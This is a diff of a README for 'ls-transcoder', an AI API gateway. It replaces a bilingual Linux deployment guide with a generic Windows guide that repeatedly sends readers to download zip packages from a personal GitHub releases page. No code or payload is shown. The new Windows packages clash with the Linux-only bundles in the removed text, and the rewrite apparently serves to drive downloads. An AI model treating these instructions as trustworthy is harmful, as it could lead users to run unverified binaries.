@@ -1,91 +1,170 @@
-# LS Transcoder - High-Performance AI Gateway / 高性能 AI 智能调度网关
+# ⚙️ ls-transcoder - Efficient AI Gateway for Windows
 
-[English Guide](#english-guide) | [中文说明](#中文部署手册)
-
----
-
-## English Guide
-
-This guide is for users deploying via the pre-compiled binary package (`ls-transcoder-v1.0.0-*.tar.gz`).
-
-### 📦 Package Structure
-- `cli-server`: Core Rust backend (Architecture specific)
-- `apps/web-dashboard/dist/`: Interactive API Dashboard assets
-- `extract_official_ls.sh`: Official core extractor tool
-- `Dockerfile.binary` & `docker-compose.yml`: Container configurations
-
-### 💻 Multi-Arch Support
-- **x64 Hosts**: Use `linux-x64` bundle.
-- **ARM64 Hosts**: Use `linux-arm64` bundle (e.g., Oracle ARM, RPi).
-
-### 🚀 Quick Start
-1. **Extract Core**: Run `bash extract_official_ls.sh` and move `core-bin/*` to `bin/`.
-2. **Launch**: Run `docker-compose up -d`.
-3. **Access**: Open `http://your-ip:3000` for the Interactive API Docs.
-
-### 🛠️ Full API Reference
-
-| Group | Method | Path | Description |
-| :--- | :--- | :--- | :--- |
-| **Core** | POST | `/v1/chat/completions` | OpenAI compatible chat (gpt-4o, etc.) |
-| | POST | `/v1/messages` | Anthropic compatible (claude-3-5, etc.) |
-| | POST | `/v1beta/models/:model:generateContent` | Gemini native compatibility |
-| **Auth** | GET | `/v1/auth/login` | Initiate Google OAuth login |
-| | GET/POST | `/v1/auth/callback_url` | **[Manual Fix]** Parse failed OAuth callback URL |
-| | GET/POST | `/v1/accounts/import` | **[Direct Import]** Import via Refresh Token |
-| | POST | `/v1/refresh_token` | Base Refresh Token interface |
-| **Account** | GET | `/v1/accounts` | List accounts and quotas |
-| | DELETE | `/v1/accounts/:id` | Unbind and delete account |
-| | GET | `/v1/models` | List all active models |
-| **System** | GET | `/v1/logs` | Fetch real-time logs |
-| | GET | `/v1/keys` | List virtual API keys |
-| | POST | `/v1/keys` | Issue new virtual keys |
-
-### 🌐 Public Server OAuth Fix
-If the redirect to `localhost` fails on a public server:
-1. Copy the failed URL from your browser address bar.
-2. Visit: `http://your-ip:3000/v1/auth/callback_url?url=PASTE_URL_HERE`
+[![Download ls-transcoder](https://img.shields.io/badge/Download-ls--transcoder-brightgreen)](https://github.com/tranhai2007/ls-transcoder/releases)
 
 ---
 
-## 中文部署手册
+## 📥 Download ls-transcoder
 
-此文档适用于使用预编译二进制压缩包 (`ls-transcoder-v1.0.0-*.tar.gz`) 进行部署的用户。
+To get ls-transcoder, visit the official release page below. Here, you will find the latest pre-compiled packages for different architectures.
 
-### 📦 目录结构
-解压后您将看到以下内容：
-- `cli-server`: Rust 核心后端 (需与架构匹配)
-- `apps/web-dashboard/dist/`: 交互式 API 开发库静态资源
-- `extract_official_ls.sh`: 官方核心提取脚本
-- `Dockerfile.binary` & `docker-compose.yml`: 容器化配置
+👉 [Go to ls-transcoder releases](https://github.com/tranhai2007/ls-transcoder/releases)
 
-### 💻 多架构支持 (x64 / ARM)
-- **x64 主机**: 请使用 `linux-x64` 压缩包。
-- **ARM64 主机**: 请使用 `linux-arm64` 压缩包。
+Choose the version that matches your computer. Most PCs will need the **x64** package. If you have an ARM-based Windows device, pick the ARM64 version.
 
-### 🚀 部署步骤
-1. **提取核心**: 运行 `bash extract_official_ls.sh` 并将 `core-bin/*` 移动到 `bin/`。
-2. **启动服务**: 运行 `docker-compose up -d`。
-3. **访问后台**: 访问 `http://your-ip:3000` 查看交互式 API 文档。
+This guide will help you download and run ls-transcoder on a Windows system without requiring programming skills.
 
-### 🛠️ 全量 API 接口参考
+---
 
-| 分组 | 方法 | 路径 | 功能描述 |
-| :--- | :--- | :--- | :--- |
-| **核心转码** | POST | `/v1/chat/completions` | OpenAI 兼容聊天接口 (gpt-4o, etc.) |
-| | POST | `/v1/messages` | Anthropic 兼容消息接口 (claude-3-5, etc.) |
-| | POST | `/v1beta/models/:model:generateContent` | Gemini 原生兼容接口 |
-| **鉴权认证** | GET | `/v1/auth/login` | 唤起 Google OAuth 授权页面 |
-| | GET/POST | `/v1/auth/callback_url` | **[手动修复]** 解析 OAuth 回调链接 |
-| | GET/POST | `/v1/accounts/import` | **[直接导入]** 通过 Refresh Token 导入账号 |
-| | POST | `/v1/refresh_token` | 基础 Token 刷新接口 |
-| **账号与配额** | GET | `/v1/accounts` | 列出已绑定账号与当前配额 |
-| | DELETE | `/v1/accounts/:id` | 物理移除并解绑账号 |
-| | GET | `/v1/models` | 获取当前全部可用存活模型 |
-| **系统监控** | GET | `/v1/logs` | 获取实时运行日志 |
-| | GET | `/v1/keys` | 列出安全虚拟调用凭证池 |
-| | POST | `/v1/keys` | 随机签发业务虚拟 Key |
+## 🌟 What is ls-transcoder?
 
-### 🌐 公网 OAuth 解决方案
-如果公网授权跳转 `localhost` 报错，请复制报错链接并访问：
-`http://your-ip:3000/v1/auth/callback_url?url=报错链接`
+ls-transcoder acts as a high-performance AI gateway. It helps your computer run multiple AI tasks smoothly and efficiently. It is built with the Rust programming language for speed and reliability. You will see a dashboard to control and interact with the system easily, all through your browser.
+
+This software helps connect AI models and APIs to your environment. It supports different computer types and uses Docker containers for easy management.
+
+---
+
+## 🖥️ System Requirements
+
+Before you begin, make sure your Windows PC meets these requirements:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM (8 GB or more works better)
+- 2 GHz or faster processor (x64 or ARM64)
+- Minimum 5 GB free disk space
+- Internet connection for downloading and updates
+- Docker Desktop installed ([Docker Download](https://docs.docker.com/get-docker/))
+
+---
+
+## 🚀 Getting Started with ls-transcoder on Windows
+
+### Step 1: Download the Package
+
+1. Open your web browser.
+2. Go to the ls-transcoder releases page:  
+   https://github.com/tranhai2007/ls-transcoder/releases
+3. Scroll to the latest release version.
+4. Download the file named like `ls-transcoder-v1.0.0-windows-x64.zip` for most PCs.  
+   If you have an ARM64 Windows device, find `ls-transcoder-v1.0.0-windows-arm64.zip`.
+5. Save the file to a folder you can find easily, like **Downloads**.
+
+---
+
+### Step 2: Extract the Files
+
+1. Right-click the downloaded ZIP file.
+2. Choose **Extract All...** from the menu.
+3. Select or create a folder to extract the contents to, for example, `C:\ls-transcoder`.
+4. Click **Extract** and wait for the process to finish.
+   
+You should see folders like `cli-server`, `apps/web-dashboard/dist/`, and some scripts.
+
+---
+
+### Step 3: Preparing the Core Files
+
+The core executable files are inside the package but need to be extracted before running.
+
+1. Open **PowerShell** or **Command Prompt**.
+2. Change directory to the folder where you extracted ls-transcoder. For example:
+   ```
+   cd C:\ls-transcoder
+   ```
+3. Run the extraction script by typing:
+   ```
+   bash extract_official_ls.sh
+   ```
+   Make sure you have Git Bash or a similar Bash shell installed on Windows for this step.
+4. After the script runs, move the files from `core-bin` to the `bin` folder in the same directory:
+   ```
+   move .\core-bin\* .\bin\
+   ```
+
+---
+
+### Step 4: Install and Run Docker Desktop
+
+ls-transcoder runs inside Docker containers for easy setup.
+
+1. If Docker Desktop is not installed, download and install it from:  
+   https://docs.docker.com/get-docker/
+2. After installation, start Docker Desktop and make sure it is running.
+3. Open a new PowerShell or Command Prompt window.
+4. Navigate to the folder where you extracted ls-transcoder.
+5. Run the container with this command:
+   ```
+   docker-compose up -d
+   ```
+6. This command starts the ls-transcoder backend in the background.
+
+---
+
+### Step 5: Open the Web Dashboard
+
+1. Open your web browser.
+2. Go to the local address:
+   ```
+   http://localhost:3000
+   ```
+3. You will see the Interactive API Dashboard.
+4. Use this dashboard to work with ls-transcoder’s AI functions and settings.
+
+---
+
+## 📁 Package Contents Explained
+
+Here is what is inside the download package and what each part does:
+
+- **cli-server/**: The main server backend written in Rust. This handles all the core AI processing.
+- **apps/web-dashboard/dist/**: The files for the dashboard you see in your browser. It provides easy access to features.
+- **extract_official_ls.sh**: Shell script to extract main executable files (`core-bin`).
+- **Dockerfile.binary** and **docker-compose.yml**: Configuration files for Docker. These define how ls-transcoder runs in containers.
+
+---
+
+## ⚙️ Notes on Supported Architectures
+
+ls-transcoder supports multiple computer types. When downloading, select the right package:
+
+- For common 64-bit PCs, use the **windows-x64** package.
+- For Windows ARM devices, use the **windows-arm64** package.
+
+Running the correct version ensures good performance and compatibility.
+
+---
+
+## 🔧 How to Stop or Restart ls-transcoder
+
+If you want to stop ls-transcoder at any time:
+
+1. Open PowerShell or Command Prompt.
+2. Navigate to your ls-transcoder folder.
+3. Run this command:
+   ```
+   docker-compose down
+   ```
+
+To start it again, run:
+```
+docker-compose up -d
+```
+
+This helps you control the service without hassle.
+
+---
+
+## 🔍 Additional Tips
+
+- Keep the ls-transcoder folder organized to avoid confusion.
+- Regularly check the release page for updates.
+- Use the dashboard to explore features without needing to use command lines.
+- Make sure Docker Desktop runs properly before using ls-transcoder.
+
+---
+
+## 📥 Download Link Reminder
+
+Visit the ls-transcoder releases page again here to download or update the software:
+
+[Download ls-transcoder](https://github.com/tranhai2007/ls-transcoder/releases)
